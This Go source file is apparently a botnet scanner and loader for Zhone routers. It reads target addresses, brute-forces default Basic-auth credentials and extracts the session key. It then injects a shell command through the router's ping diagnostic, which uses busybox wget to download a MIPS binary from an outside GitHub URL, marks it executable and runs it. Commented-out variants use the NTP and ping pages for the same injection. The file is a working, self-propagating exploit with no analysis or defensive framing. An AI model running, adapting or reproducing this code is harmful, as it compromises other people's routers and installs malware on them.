package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var CONNECT_TIMEOUT time.Duration = 30
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10
var syncWait sync.WaitGroup
var statusAttempted, statusLogins, statusFound, statusVuln int

var timeVal int
var timeValString string

var payloadEncoded string = "varpayloadEncodedstring%3D%22%2Fbin%2Fbusybox%20wget%20https%3A%2F%2Fraw.githubusercontent.com%2F20Matrix77%2FDHJIF%2Frefs%2Fheads%2Fmain%2Fmips%20-O%20%2Fvar%2Fg%3B%20chmod%20777%20%2Fvar%2Fg%3B%20%2Fvar%2Fg%20zhone%22"
var logins = [...]string{"admin:admin", "admin:cciadmin", "Admin:Admin", "user:user", "admin:zhone", "vodafone:vodafone"}
var payload string = ""

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func getStringInBetween(str string, start string, end string) (result string) {

	s := strings.Index(str, start)
	if s == -1 {
		return
	}

	s += len(start)
	e := strings.Index(str, end)

	if s > 0 && e > s+1 {
		return str[s:e]
	} else {
		return "null"
	}
}

func processTarget(target string) {

	var sessionKey string
	var isAuted int = 0
	var authPos int = 0

	statusAttempted++

	conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
	if err != nil {
		syncWait.Done()
		return
	}

	setWriteTimeout(conn, WRITE_TIMEOUT)
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	setReadTimeout(conn, READ_TIMEOUT)
	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	if strings.Contains(string(bytebuf), "401 Unauthorized") && strings.Contains(string(bytebuf), "Basic realm=") {
		statusFound++
	} else {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	zeroByte(bytebuf)
	conn.Close()

	for i := 0; i < len(logins); i++ {
		conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
		if err != nil {
			break
		}

		setWriteTimeout(conn, WRITE_TIMEOUT)
		conn.Write([]byte("GET /zhnping.html HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http:// " + target + "/menu.html\r\nAuthorization: Basic " + logins[i] + "\r\n\r\n"))

		setReadTimeout(conn, READ_TIMEOUT)
		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			syncWait.Done()
			return
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			sessionKey = getStringInBetween(string(bytebuf), "var sessionKey='", "';")
			authPos = i
			statusLogins++
			isAuted = 1
			zeroByte(bytebuf)
			conn.Close()
			break
		} else {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}
	}

	if isAuted == 0 || sessionKey == "null" {
		syncWait.Done()
		return
	}

	conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
	if err != nil {
		syncWait.Done()
		return
	}

	setWriteTimeout(conn, WRITE_TIMEOUT)

	// ntp command injection
	//conn.Write([]byte("GET /sntpcfg.cgi?ntp_enabled=1&ntpServer1=time.nist.gov&ntpServer2=;" + payloadEncoded + ";&ntpServer3=&ntpServer4=&ntpServer5=&timezone_offset=+01:00&timezone=Amsterdam,%20Berlin,%20Bern,%20Rome,%20Stockholm,%20Vienna&use_dst=0&sessionKey=" + sessionKey + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic " + logins[authPos] + "\r\nConnection: close\r\nReferer: http://" + target + "/sntpcfg.html\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	// ping command injection
	//conn.Write([]byte("GET /pingcmd.cmd?&type=Ping&tag=out&address=www.dqusa.com;" + payloadEncoded + ";echo%20h&sessionKey=" + sessionKey + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic " + logins[authPos] + "\r\nConnection: close\r\nReferer: http://" + target + "/gdiag_outbound.html\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	conn.Write([]byte("GET /zhnping.cmd?&test=ping&sessionKey=" + sessionKey + "&ipAddr=1.1.1.1;" + payloadEncoded + "&count=4&length=64 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Intel Mac OS X 10.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Edg/81.0.416.72\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://" + target + "/diag.html\r\nAuthorization: Basic " + logins[authPos] + "\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	setReadTimeout(conn, READ_TIMEOUT)
	bytebuf = make([]byte, 2048)
	l, err = conn.Read(bytebuf)
	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		syncWait.Done()
		return
	}

	if strings.Contains(string(bytebuf), "/var/pinglog") {
		fmt.Println(string(bytebuf))
		statusVuln++
	}

	zeroByte(bytebuf)
	conn.Close()
	syncWait.Done()
	return

}

func main() {

	var i int = 0

	rand.Seed(int64(os.Getpid()))
	timeVal = rand.Int() % 100000
	timeValString = strconv.Itoa(timeVal)

	for i = 0; i < len(logins); i++ {
		logins[i] = base64.StdEncoding.EncodeToString([]byte(logins[i]))
	}

	i = 0

	if len(os.Args) != 2 {
		fmt.Println("[Scanner] Missing argument (port/listen)")
		return
	}

	go func() {
		for {
			fmt.Printf("%d's | Attempted %d | Found %d | Logins %d | Vuln %d\r\n", i, statusAttempted, statusFound, statusLogins, statusVuln)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			if os.Args[1] == "listen" {
				go processTarget(scan.Text())
			} else {
				go processTarget(scan.Text() + ":" + os.Args[1])
			}
			syncWait.Add(1)
		}
	}
}
